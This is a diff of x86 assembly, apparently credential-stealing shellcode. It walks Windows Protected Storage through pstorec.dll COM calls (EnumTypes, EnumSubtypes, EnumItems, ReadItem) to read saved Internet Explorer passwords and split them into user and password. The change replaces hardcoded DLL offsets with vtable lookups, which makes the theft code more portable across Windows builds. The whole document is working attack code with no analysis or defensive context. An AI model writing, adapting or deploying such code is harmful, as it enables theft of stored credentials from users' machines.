@@ -99,10 +99,11 @@ PStore.EnumTypes: 	 ; returns address to EnumPStoreTypes (00942568) in pEnumPSto
   push edx 		 ; arg1: pEnumPstoreTypes
   push 0		 ; arg2: NULL
   push 0		 ; arg3: NULL
-  mov eax, [eax]	 ; load base address of PStore in eax
+  mov eax, [eax] ; load base address of PStore in eax
   push eax		 ; push base address of PStore (this)
-  mov edx, ebx		 ; generate function address of IPStore::EnumTypes in pstorec.dll
-  add edx, 0x00005586
+  mov edx, [eax] ; get function address of IPStore::EnumTypes in pstorec.dll
+  mov edx, [edx+0x38] ;&EnumTypes() = *(*(&PStore)+0x38)
+  ;add edx, 0x00005586
   call edx		 ; call IPStore::EnumTypes
 
   mov edi, 0x5e7e8100 	 ; Value of pTypeGUID if Password is IE:Password-Protected
@@ -118,10 +119,11 @@ EnumPStoreTypes.raw_Next:
   push 0		 ; arg1: NULL
   push ecx		 ; arg2: pTypeGUID
   push 1		 ; arg3: 1
-  mov edx, [edx]	 ; load base address of EnumPStoreTypes (00942568)
+  mov edx, [edx] ; load base address of EnumPStoreTypes (00942568)
   push edx		 ; push base address of EnumPStoreTypes (this)
-  mov edx, ebx		 ; generate function address of EnumPStoreTypes::raw_Next in pstorec.dll
-  add edx, 0x00004E4F
+  mov edx, [edx] ; get function address of EnumPStoreTypes::raw_Next in pstorec.dll
+  mov edx, [edx+0x0C] ; &RawNext = *(*(*(&EnumPStoreTypes))+0x0C)
+  ;add edx, 0x00004E4F
   call edx		 ; call EnumPStoreTypes::raw_Next
 
   mov eax, [esp+8]
@@ -149,8 +151,9 @@ PStore.EnumSubtypes:     ; returns address to EnumSubtypes () in pEnumSubtypes (
   push 0                 ; arg4: NULL
   mov eax, [eax]         ; load base address of PStore in eax
   push eax               ; push base address of PStore (this)
-  mov edx, ebx           ; generate function address of IPStore::EnumSubtypes in pstorec.dll
-  add edx, 0x0000560C
+  mov edx, [eax]         ; get function address of IPStore::EnumSubtypes in pstorec.dll
+  mov edx, [edx+0x3C] 	 ; &Pstore.EnumSubTypes() = *(*(*(&PStore))+0x3C)
+  ;add edx, 0x0000560C
   call edx               ; call IPStore::EnumSubtypes
 
 EnumSubtypes.raw_Next:
@@ -160,11 +163,12 @@ EnumSubtypes.raw_Next:
   push 0		 ; arg1: NULL
   push edx		 ; arg2: psubTypeGUID
   push 1		 ; arg3: 1
-  mov eax, [eax]	 ; load base address of EnumSubtypes in eax
+  mov eax, [eax] ; load base address of EnumSubtypes in eax
   push eax		 ; push base address of EnumSubtypes (this)
-  mov edx, ebx           ; generate function address of raw_Next in pstorec.dll
-  add edx, 0x00004E4F
-  call edx               ; call EnumSubtypes.raw_Next
+  mov edx, [eax] ; get function address of raw_Next in pstorec.dll
+  mov edx, [edx+0x0C] ; &(EnumSubtypes.raw_Next) = *(*(&EnumSubtypes)+0x0C)
+  ;add edx, 0x00004E4F
+  call edx       ; call EnumSubtypes.raw_Next
 
 PStore.EnumItems:
   pop eax		 ; pop pPstore
@@ -181,10 +185,12 @@ PStore.EnumItems:
   push ecx		 ; arg3: psubTypeGUID
   push edx		 ; arg4: pTyoeGUID
   push 0		 ; arg5: NULL
-  mov eax, [eax]         ; load base address of PStore in eax
-  push eax               ; push base address of PStore (this)
-  mov edx, ebx           ; generate function address of IPStore::Enumitems in pstorec.dll
-  add edx, 0x000056A0
+  mov eax, [eax] ; load base address of PStore in eax
+  push eax       ; push base address of PStore (this)
+  mov edx, [eax] ; get function address of IPStore::Enumitems in pstorec.dll
+  ;mov edx, [edx]
+  mov edx, [edx+0x54]
+  ;add edx, 0x000056A0
   call edx               ; call IPStore::Enumitems
 
 spEnumItems.raw_Next:
@@ -194,10 +200,11 @@ spEnumItems.raw_Next:
   push 0		 ; arg1: NULL
   push ecx		 ; arg2: pitemName
   push 1		 ; arg3: 1
-  mov eax, [eax]	 ; load base address of spEnumItems in eax
+  mov eax, [eax] ; load base address of spEnumItems in eax
   push eax		 ; push base addres of spEnumItems (this)
-  mov edx, ebx		 ; generate function address of raw_Next in pstorec.dll
-  add edx, 0x000048D1
+  mov edx, [eax] ; get function address of raw_Next in pstorec.dll
+  mov edx, [edx+0x0C]
+  ;add edx, 0x000048D1
   call edx
 
 PStore.ReadItem:
@@ -220,8 +227,9 @@ PStore.ReadItem:
   push 0		 ; arg8: NULL
   mov eax, [eax]	 ; load base address of PStore in eax
   push eax		 ; push base addres of PStore (this)
-  mov edx, ebx           ; generate function address of IPStore::ReadItem in pstorec.dll
-  add edx, 0x000042B6
+  mov edx, [eax] ; get function address of IPStore::ReadItem in pstorec.dll
+  mov edx, [edx+0x44]
+  ;add edx, 0x000042B6
   call edx
 
 split_user_pass:
